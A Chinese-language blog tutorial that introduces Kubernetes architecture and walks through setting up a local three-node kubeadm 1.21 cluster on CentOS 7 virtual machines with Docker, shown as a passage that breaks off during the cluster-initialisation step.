    <content type="html"><![CDATA[<p>Kubernetes 介绍、主要功能、本地虚拟机环境搭建、</p><span id="more"></span><h2 id="Kubernetes介绍"><a href="#Kubernetes介绍" class="headerlink" title="Kubernetes介绍"></a>Kubernetes介绍</h2><blockquote><p>希腊语：舵手、飞行员</p></blockquote><ul><li><p>Kubernetes是一个全新的基于容器技术的分布式架构领先方案, 它是Google在2014年6月开源的一个容器集群管理系统，使用Go语言开发，Kubernetes也叫K8S。K8S是Google内部一个叫Borg的容器集群管理系统衍生出来的，Borg已经在Google大规模生产运行十年之久。K8S主要用于自动化部署、扩展和管理容器应用，提供了资源调度、部署管理、服务发现、扩容缩容、监控等一整套功能。2015年7月，Kubernetes v1.0正式发布。</p></li><li><p>Kubernetes作为一个容器集群管理系统，用于管理容器云平台中多个主机上的容器应用，Kubernetes的目标是让部署容器化的应用变得简单且高效，所以 Kubernetes 提供了应用部署，规划，更新，维护的一整套完整的机制。</p></li><li><p>除了Docker容器之外，Kubernetes还支持其他多种容器，如 Containerd、rkt、CoreOS 等</p></li></ul><h2 id="认识Kubernetes"><a href="#认识Kubernetes" class="headerlink" title="认识Kubernetes"></a>认识Kubernetes</h2><h3 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h3><ul><li><p>源自于谷歌Borg</p></li><li><p>使用golang语言开发</p></li><li><p>简称为k8s</p></li></ul><h3 id="归属"><a href="#归属" class="headerlink" title="归属"></a>归属</h3><p>现归属于CNCF</p><ul><li><p>云原生(CloudNative)计算基金会</p></li><li><p>是一个开源软件基金会，致力于使云计算普遍性和持续性</p></li><li><p>官方：<a href="http://www.cncf.io/">http://www.cncf.io</a></p></li></ul><h3 id="kubernetes版本"><a href="#kubernetes版本" class="headerlink" title="kubernetes版本"></a>kubernetes版本</h3><ul><li>2014年9月第一个正式版本</li><li>2015年7月1.0版本正式发布</li><li>现在最新版本为1.27</li><li>主要贡献者：Google,Redhat,Microsoft,IBM,Intel</li><li>代码托管github:<a href="https://github.com/kubernetes/">https://github.com/kubernetes/</a></li></ul><h3 id="架构说明"><a href="#架构说明" class="headerlink" title="架构说明"></a>架构说明</h3><ul><li>Master Node<ul><li>中心节点</li><li>manager</li><li>简单叫法<ul><li>master节点</li></ul></li></ul></li><li>Minion Node<ul><li>工作节点</li><li>worker</li><li>简单叫点<ul><li>node节点</li><li>worker节点</li></ul></li></ul></li></ul><h3 id="节点组件"><a href="#节点组件" class="headerlink" title="节点组件"></a>节点组件</h3><h4 id="Master节点组件"><a href="#Master节点组件" class="headerlink" title="Master节点组件"></a>Master节点组件</h4><p>master节点是集群管理中心，它的组件可以在集群内任意节点运行，但是为了方便管理所以会在一台主机上运行Master所有组件，<strong>并且不在此主机上运行用户容器</strong></p><p>Master组件包括：</p><ul><li><code>kube-apiserver</code></li></ul><p>​      用于暴露kubernetes API，任何的资源请求&#x2F;调用操作都是通过kube-apiserver提供的接口进行。</p><ul><li><code>kube-controller-manager</code></li></ul><p>​      控制器管理器，用于对控制器进行管理，它们是集群中处理常规任务的后台线程。</p><ul><li><p><code>kube-scheduler</code></p><p>监视新创建没有分配到Node的Pod，为Pod选择一个Node运行。</p></li><li><p><code>ETCD</code></p><p>是kubernetes提供默认的存储系统，保存所有集群数据。</p></li></ul><h4 id="Node节点组件"><a href="#Node节点组件" class="headerlink" title="Node节点组件"></a>Node节点组件</h4><p>node节点用于运行以及维护Pod, 管理volume(CVI)和网络(CNI)，维护pod及service等信息</p><p>Node组件包括：</p><ul><li><code>kubelet</code> <ul><li>负责维护容器的生命周期(创建pod，销毁pod)，同时也负责Volume(CVI)和网络(CNI)的管理</li></ul></li><li><code>kube-proxy</code> <ul><li>通过在主机上维护网络规则并执行连接转发来实现service(iptables&#x2F;ipvs)</li><li>随时与apiserver通信，把Service或Pod改变提交给apiserver，保存至etcd（可做高可用集群）中，负责service实现，从内部pod至service和从外部node到service访问。</li></ul></li><li><code>Container Runtime</code><ul><li>容器运行时(Container Runtime)</li><li>负责镜像管理以及Pod和容器的真正运行</li><li>支持docker&#x2F;containerd&#x2F;Rkt&#x2F;Pouch&#x2F;Kata等多种运行时</li></ul></li></ul><h2 id="Kubernetes环境搭建"><a href="#Kubernetes环境搭建" class="headerlink" title="Kubernetes环境搭建"></a>Kubernetes环境搭建</h2><blockquote><p>使用kubeadm本地化部署目前最新版本kubernetes版本1.27，其他部署方式也可以使用<code>kubeasz</code>、<code>kubekey</code> 等方式部署</p></blockquote><h3 id="Linux环境准备"><a href="#Linux环境准备" class="headerlink" title="Linux环境准备"></a>Linux环境准备</h3><h4 id="主机系统说明"><a href="#主机系统说明" class="headerlink" title="主机系统说明"></a>主机系统说明</h4><p>使用VMware来搭建虚拟机， aliyun镜像库 <a href="https://developer.aliyun.com/mirror/">https://developer.aliyun.com/mirror/</a></p><p>centos7下载链接：<a href="https://mirrors.aliyun.com/centos/7.9.2009/isos/x86_64/CentOS-7-x86_64-Minimal-2207-02.iso">https://mirrors.aliyun.com/centos/7.9.2009/isos/x86_64/CentOS-7-x86_64-Minimal-2207-02.iso</a></p><h4 id="虚拟机IP配置"><a href="#虚拟机IP配置" class="headerlink" title="虚拟机IP配置"></a>虚拟机IP配置</h4><p>参考：<a href="https://www.cnblogs.com/mayhot/p/15964506.html">https://www.cnblogs.com/mayhot/p/15964506.html</a></p><p>修改ip的方式</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># cd到网络配置文件路径</span><span class="token builtin class-name">cd</span> /etc/sysconfig/network-scripts/<span class="token comment"># 编辑ifcfg-en33</span><span class="token function">vi</span> ifcfg-en33<span class="token comment"># 重启网卡</span>systemctl restart network<span class="token comment"># 查看ip</span><span class="token function">ip</span> addr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">TYPE</span><span class="token operator">=</span>Ethernet<span class="token assign-left variable">PROXY_METHOD</span><span class="token operator">=</span>none<span class="token assign-left variable">BROWSER_ONLY</span><span class="token operator">=</span>no<span class="token assign-left variable">BOOTPROTO</span><span class="token operator">=</span>static<span class="token assign-left variable">DEFROUTE</span><span class="token operator">=</span>yes<span class="token assign-left variable">IPV4_FAILURE_FATAL</span><span class="token operator">=</span>no<span class="token assign-left variable">IPV6INIT</span><span class="token operator">=</span>yes<span class="token assign-left variable">IPV6_AUTOCONF</span><span class="token operator">=</span>yes<span class="token assign-left variable">IPV6_DEFROUTE</span><span class="token operator">=</span>yes<span class="token assign-left variable">IPV6_FAILURE_FATAL</span><span class="token operator">=</span>no<span class="token assign-left variable">IPV6_ADDR_GEN_MODE</span><span class="token operator">=</span>stable-privacy<span class="token assign-left variable">NAME</span><span class="token operator">=</span>ens33<span class="token assign-left variable">UUID</span><span class="token operator">=</span>56d45dc8-a17d-4eca-852c-97167c783f01<span class="token assign-left variable">DEVICE</span><span class="token operator">=</span>ens33<span class="token assign-left variable">ONBOOT</span><span class="token operator">=</span>yes<span class="token assign-left variable">IPADDR</span><span class="token operator">=</span><span class="token number">192.168</span>.100.11<span class="token assign-left variable">NETMASK</span><span class="token operator">=</span><span class="token number">255.255</span>.255.0<span class="token assign-left variable">GATEWAY</span><span class="token operator">=</span><span class="token number">192.168</span>.100.2<span class="token assign-left variable">DNS1</span><span class="token operator">=</span><span class="token number">192.168</span>.100.2<span class="token assign-left variable">DNS2</span><span class="token operator">=</span><span class="token number">114.114</span>.114.114<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>改动如下 <code>IPADDR</code>自己分配 、<code>GATEWAY</code> 查看虚拟机的网络<code>NAT</code>网络配置</p><blockquote><p><code>BOOTPROTO=static</code>   </p><p><code>ONBOOT=yes</code><br><code>IPADDR=192.168.100.11</code><br><code>NETMASK=255.255.255.0</code><br><code>GATEWAY=192.168.100.2</code><br><code>DNS1=192.168.100.2</code><br><code>DNS2=114.114.114.114</code></p></blockquote><p>如果重启网络还是连接不上，可能是NetworkManager导致的，关闭这个服务</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl stop NetworkManagersystemctl disable NetworkManager<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>参考：<a href="https://www.cnblogs.com/python-wen/p/11607969.html">https://www.cnblogs.com/python-wen/p/11607969.html</a></p><blockquote><p>我这里采用静态IP配置，网关设值为192.168.100.0  掩码是255.255.255.0 所以后续分配ip 就可以从 192.168.100.1~192.168.100.255  </p></blockquote><h4 id="主机硬件配置说明"><a href="#主机硬件配置说明" class="headerlink" title="主机硬件配置说明"></a>主机硬件配置说明</h4><table><thead><tr><th>IP</th><th>CPU</th><th>内存</th><th>硬盘</th><th>主机名</th></tr></thead><tbody><tr><td>192.168.100.11</td><td>4C</td><td>6G</td><td>50g</td><td>master01</td></tr><tr><td>192.168.100.12</td><td>4C</td><td>6G</td><td>50g</td><td>worker01</td></tr><tr><td>192.168.100.13</td><td>4C</td><td>6G</td><td>50g</td><td>worker02</td></tr></tbody></table><blockquote><p>注意：这里分配6g内存并不会直接占用系统6g内存给当前虚拟机使用，而是动态去申请的</p></blockquote><p>配置方式从原生的静态IP的纯净的系统中关机，克隆。克隆后重新设置静态ip，然后重启，使用shell工具链接，我这里使用FinalShell链接。</p><h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><h5 id="主机名配置"><a href="#主机名配置" class="headerlink" title="主机名配置"></a>主机名配置</h5><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 设置主机名</span>hostnamectl set-hostname xxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><h5 id="主机名与IP地址解析"><a href="#主机名与IP地址解析" class="headerlink" title="主机名与IP地址解析"></a>主机名与IP地址解析</h5><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 在hosts后面追加内容</span><span class="token function">vi</span> /etc/hosts<span class="token number">192.168</span>.100.11 master01<span class="token number">192.168</span>.100.12 worker01<span class="token number">192.168</span>.100.13 worker02<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h5 id="关闭防火墙配置"><a href="#关闭防火墙配置" class="headerlink" title="关闭防火墙配置"></a>关闭防火墙配置</h5><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl disable firewalldsystemctl stop firewalldfirewall-cmd <span class="token parameter variable">--state</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><h5 id="SELINUX配置"><a href="#SELINUX配置" class="headerlink" title="SELINUX配置"></a>SELINUX配置</h5><blockquote><p>SELinux在Kubernetes中的作用是提供额外的安全层，增强容器化应用程序和整个集群的安全性。它限制容器的访问权限、提供安全策略、保护文件系统，并记录安全事件，有助于保护集群免受恶意行为和攻击。</p></blockquote><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sed</span> <span class="token parameter variable">-ri</span> <span class="token string">'s/SELINUX=enforcing/SELINUX=disabled/'</span> /etc/selinux/config<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h5 id="时间同步设置"><a href="#时间同步设置" class="headerlink" title="时间同步设置"></a>时间同步设置</h5><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> ntpdate <span class="token parameter variable">-y</span>ntpdate time1.aliyun.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><h5 id="配置内核转发及网桥过滤"><a href="#配置内核转发及网桥过滤" class="headerlink" title="配置内核转发及网桥过滤"></a>配置内核转发及网桥过滤</h5><p>添加内核转发及网桥过滤配置文件</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> <span class="token operator">></span> /etc/sysctl.d/k8s.conf <span class="token operator">&lt;&lt;</span><span class="token string">EOFnet.bridge.bridge-nf-call-ip6tables = 1net.bridge.bridge-nf-call-iptables = 1net.ipv4.ip_forward = 1vm.swappiness = 0EOF</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>加载内核转发及网桥过滤配置文件</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sysctl</span> <span class="token parameter variable">-p</span> /etc/sysctl.d/k8s.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h5 id="安装ipset及ipvsadm"><a href="#安装ipset及ipvsadm" class="headerlink" title="安装ipset及ipvsadm"></a>安装ipset及ipvsadm</h5><blockquote><p>主要用于实现service转发。</p></blockquote><p>安装ipset、ipvsadm</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token parameter variable">-y</span> <span class="token function">install</span> ipset ipvsadm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>配置ipvsadm模块加载方式</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> <span class="token operator">></span> /etc/sysconfig/modules/ipvs.modules <span class="token operator">&lt;&lt;</span><span class="token string">EOF#!/bin/bashmodprobe -- ip_vsmodprobe -- ip_vs_rrmodprobe -- ip_vs_wrrmodprobe -- ip_vs_shmodprobe -- nf_conntrackEOF</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>授权、运行、检查是否加载</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">755</span> /etc/sysconfig/modules/ipvs.modules <span class="token operator">&amp;&amp;</span> <span class="token function">bash</span> /etc/sysconfig/modules/ipvs.modules <span class="token operator">&amp;&amp;</span> lsmod <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-e</span> ip_vs <span class="token parameter variable">-e</span> nf_conntrack<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h5 id="关闭swap分区"><a href="#关闭swap分区" class="headerlink" title="关闭swap分区"></a>关闭swap分区</h5><p>在下面这行添加#注释</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vi</span> /etc/fstab<span class="token comment"># /dev/mapper/centos-swap swap                    swap    defaults        0 0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="安装版本说明"><a href="#安装版本说明" class="headerlink" title="安装版本说明"></a>安装版本说明</h3><blockquote><p>k8s官方于 2020 年 12 月宣布弃用 dockershim，此后k8s从 1.2.0 到 1.2.3 版本如果使用 Docker 作为容器运行时会在 kubelet 启动时会打印一个弃用的警告日志，而最终k8s官方在 2022 年 4 月 的 Kubernetes 1.24 版本中完全移除了 dockershim（<a href="https://link.zhihu.com/?target=https://kubernetes.io/zh-cn/blog/2022/02/17/dockershim-faq/">弃用dockershim相关问题官方说明</a>）</p></blockquote><p>k8s官方在1.24版本以后移除了docker ，后续采用<code>k8s+containerd</code>方式进行搭配使用，如果后续还需使用docker 需要安装<code>cri-docker</code> 其实也就是<code>k8s+docker+cri-docker</code></p><p>对于 k8s+containerd 和 k8s+docker 的两种方案网上也有网友进行了性能测试对比，前者的运行速度、效率都要比后者高，且各大公有云厂商也都往 containerd 切换，因此 k8s+containerd 的组合就成了目前最合适的方案了</p><p>我们这里第一简单安装采用低版本的k8s+docker就行，后续会继续出一篇新版本 k8s1.27版本的来做</p><p>版本如下：</p><p>查阅地址：<a href="https://github.com/kubernetes/kubernetes/blob/release-1.22/build/dependencies.yaml">https://github.com/kubernetes/kubernetes/blob/release-1.22/build/dependencies.yaml</a></p><p><code>kubernetes 1.21.0</code>+<code>docker 20.10</code></p><h3 id="Docker环境准备（所有节点均需要安装）"><a href="#Docker环境准备（所有节点均需要安装）" class="headerlink" title="Docker环境准备（所有节点均需要安装）"></a>Docker环境准备（所有节点均需要安装）</h3><blockquote><p>docker 20.10 版本安装</p></blockquote><h4 id="获取yum-源"><a href="#获取yum-源" class="headerlink" title="获取yum 源"></a>获取yum 源</h4><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo <span class="token parameter variable">-O</span> /etc/yum.repos.d/docker-ce.repo<span class="token comment"># 列出所有的docker 版本 选择指定的版本安装</span>yum list docker-ce.x86_64 <span class="token parameter variable">--showduplicates</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token parameter variable">-r</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h4 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h4><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># --setopt=obsoletes=0  告诉Yum在处理软件包依赖关系时不考虑旧的或过时的软件包</span>yum <span class="token parameter variable">-y</span> <span class="token function">install</span> <span class="token parameter variable">--setopt</span><span class="token operator">=</span>obsoletes<span class="token operator">=</span><span class="token number">0</span> docker-ce-20.10.23-3.el7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><h4 id="设置docker开机启动并启动docker"><a href="#设置docker开机启动并启动docker" class="headerlink" title="设置docker开机启动并启动docker"></a>设置docker开机启动并启动docker</h4><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 开机启动</span>systemctl <span class="token builtin class-name">enable</span> <span class="token function">docker</span><span class="token comment"># 启动docker</span>systemctl start <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h4 id="修改cgroup方式"><a href="#修改cgroup方式" class="headerlink" title="修改cgroup方式"></a>修改cgroup方式</h4><blockquote><p>cgroup（控制组）是一种用于限制和隔离资源的Linux内核功能。它允许您在共享的主机上为容器分配和管理资源，例如CPU、内存、磁盘和网络等</p></blockquote><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 在/etc/docker/daemon.json添加如下内容</span><span class="token function">vi</span> /etc/docker/daemon.json<span class="token punctuation">&#123;</span>        <span class="token string">"exec-opts"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span><span class="token string">"native.cgroupdriver=systemd"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h4 id="配置docker镜像加速"><a href="#配置docker镜像加速" class="headerlink" title="配置docker镜像加速"></a>配置docker镜像加速</h4><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 在/etc/docker/daemon.json添加"registry-mirrors": ["https://jjwt39jg.mirror.aliyuncs.com"]</span><span class="token comment"># 下面为当前最终版本</span><span class="token punctuation">&#123;</span>  <span class="token string">"exec-opts"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span><span class="token string">"native.cgroupdriver=systemd"</span><span class="token punctuation">]</span>,  <span class="token string">"registry-mirrors"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>  <span class="token string">"https://jjwt39jg.mirror.aliyuncs.com"</span>,  <span class="token string">"https://registry.docker-cn.com"</span>,<span class="token string">"http://hub-mirror.c.163.com"</span>,<span class="token string">"https://docker.mirrors.ustc.edu.cn"</span>  <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>重启docker</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl daemon-reload<span class="token function">sudo</span> systemctl restart <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><h4 id="dokcer卸载"><a href="#dokcer卸载" class="headerlink" title="dokcer卸载"></a>dokcer卸载</h4><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#杀死所有运行容器</span><span class="token function">docker</span> <span class="token function">kill</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> <span class="token function">ps</span> <span class="token parameter variable">-a</span> <span class="token parameter variable">-q</span><span class="token variable">)</span></span><span class="token comment">#删除所有容器</span><span class="token function">docker</span> <span class="token function">rm</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> <span class="token function">ps</span> <span class="token parameter variable">-a</span> <span class="token parameter variable">-q</span><span class="token variable">)</span></span><span class="token comment">#删除所有镜像</span><span class="token function">docker</span> rmi <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> images <span class="token parameter variable">-q</span><span class="token variable">)</span></span><span class="token comment">#停止docker相关服务</span><span class="token function">sudo</span> systemctl stop docker.socket<span class="token function">sudo</span> systemctl stop docker.service<span class="token comment">#停止docker服务</span>systemctl stop <span class="token function">docker</span><span class="token comment">#删除存储目录</span><span class="token function">rm</span> <span class="token parameter variable">-rf</span> /etc/docker<span class="token function">rm</span> <span class="token parameter variable">-rf</span> /run/docker<span class="token function">rm</span> <span class="token parameter variable">-rf</span> /var/lib/dockershim<span class="token function">rm</span> <span class="token parameter variable">-rf</span> /var/lib/docker<span class="token comment">#查看docker 安装的包</span>yum list installed <span class="token operator">|</span> <span class="token function">grep</span> <span class="token function">docker</span><span class="token comment"># 卸载docker相关安装包</span>yum remove docker-*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="安装containerd"><a href="#安装containerd" class="headerlink" title="安装containerd"></a><strong>安装containerd</strong></h3><blockquote><p>我们当前安装 <code>kubernetes 1.21.0</code>+<code>docker 20.10</code>，此步骤跳过</p></blockquote><h4 id="安装依赖软件包"><a href="#安装依赖软件包" class="headerlink" title="安装依赖软件包"></a>安装依赖软件包</h4><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token parameter variable">-y</span> <span class="token function">install</span> yum-utils device-mapper-persistent-data lvm2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h4 id="添加阿里Docker源"><a href="#添加阿里Docker源" class="headerlink" title="添加阿里Docker源"></a>添加阿里Docker源</h4><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h4 id="添加overlay和netfilter模块"><a href="#添加overlay和netfilter模块" class="headerlink" title="添加overlay和netfilter模块"></a>添加overlay和netfilter模块</h4><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> <span class="token operator">>></span>/etc/modules-load.d/containerd.conf <span class="token operator">&lt;&lt;</span><span class="token string">EOFoverlaybr_netfilterEOF</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h4 id="安装Containerd，这里安装最新版本"><a href="#安装Containerd，这里安装最新版本" class="headerlink" title="安装Containerd，这里安装最新版本"></a>安装Containerd，这里安装最新版本</h4><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token parameter variable">-y</span> <span class="token function">install</span> containerd.io<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h4 id="创建Containerd的配置文件"><a href="#创建Containerd的配置文件" class="headerlink" title="创建Containerd的配置文件"></a>创建Containerd的配置文件</h4><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /etc/containerd containerd config default <span class="token operator">></span> /etc/containerd/config.toml <span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'/SystemdCgroup/s/false/true/g'</span> /etc/containerd/config.toml <span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'/sandbox_image/s/registry.k8s.io/registry.aliyuncs.com\/google_containers/g'</span> /etc/containerd/config.toml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h4 id="启动containerd"><a href="#启动containerd" class="headerlink" title="启动containerd"></a>启动containerd</h4><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl <span class="token builtin class-name">enable</span> containerdsystemctl start containerd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><h4 id="验证containerd是否安装成功"><a href="#验证containerd是否安装成功" class="headerlink" title="验证containerd是否安装成功"></a>验证containerd是否安装成功</h4><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">containerd <span class="token parameter variable">-v</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h3 id="Kubernetes-1-21-0-（单master）集群部署"><a href="#Kubernetes-1-21-0-（单master）集群部署" class="headerlink" title="Kubernetes 1.21.0 （单master）集群部署"></a>Kubernetes 1.21.0 （单master）集群部署</h3><h4 id="kubeadm、kubelet、kubectl安装"><a href="#kubeadm、kubelet、kubectl安装" class="headerlink" title="kubeadm、kubelet、kubectl安装"></a>kubeadm、kubelet、kubectl安装</h4><table><thead><tr><th></th><th>kubeadm</th><th>kubelet</th><th>kubectl</th></tr></thead><tbody><tr><td>版本</td><td>1.21.0</td><td>1.21.0</td><td>1.21.0</td></tr><tr><td>安装位置</td><td>集群所有主机</td><td>集群所有主机</td><td>集群所有主机</td></tr><tr><td>作用</td><td>初始化集群、管理集群等</td><td>用于接收api-server指令，对pod生命周期进行管理</td><td>集群应用命令行管理工具</td></tr></tbody></table><h5 id="配置yum源"><a href="#配置yum源" class="headerlink" title="配置yum源"></a>配置yum源</h5><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># k8s源,没有就创建</span><span class="token function">vi</span> /etc/yum.repos.d/kubernetes.repo<span class="token punctuation">[</span>kubernetes<span class="token punctuation">]</span><span class="token assign-left variable">name</span><span class="token operator">=</span>Kubernetes<span class="token assign-left variable">baseurl</span><span class="token operator">=</span>https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/<span class="token assign-left variable">enabled</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">gpgcheck</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">repo_gpgcheck</span><span class="token operator">=</span><span class="token number">0</span><span class="token assign-left variable">gpgkey</span><span class="token operator">=</span>https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> <span class="token parameter variable">-y</span> kubelet-1.21.0 kubeadm-1.21.0 kubectl-1.21.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h5 id="配置kubelet"><a href="#配置kubelet" class="headerlink" title="配置kubelet"></a>配置kubelet</h5><blockquote><p>保证docker使用的cgroupdriver与kubelet使用的cgroup的一致性</p></blockquote><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># vi /etc/sysconfig/kubelet</span><span class="token assign-left variable">KUBELET_EXTRA_ARGS</span><span class="token operator">=</span><span class="token string">"--cgroup-driver=systemd"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><h5 id="设置kubelet为开机自启动并启动"><a href="#设置kubelet为开机自启动并启动" class="headerlink" title="设置kubelet为开机自启动并启动"></a>设置kubelet为开机自启动并启动</h5><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl <span class="token builtin class-name">enable</span> kubelet <span class="token operator">&amp;&amp;</span> systemctl restart kubelet<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h4 id="集群初始化（master初始化）"><a href="#集群初始化（master初始化）" class="headerlink" title="集群初始化（master初始化）"></a>集群初始化（master初始化）</h4><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#镜像清理</span><span class="token function">docker</span> system prune <span class="token parameter variable">-a</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><h5 id="方式一：先下载镜像"><a href="#方式一：先下载镜像" class="headerlink" 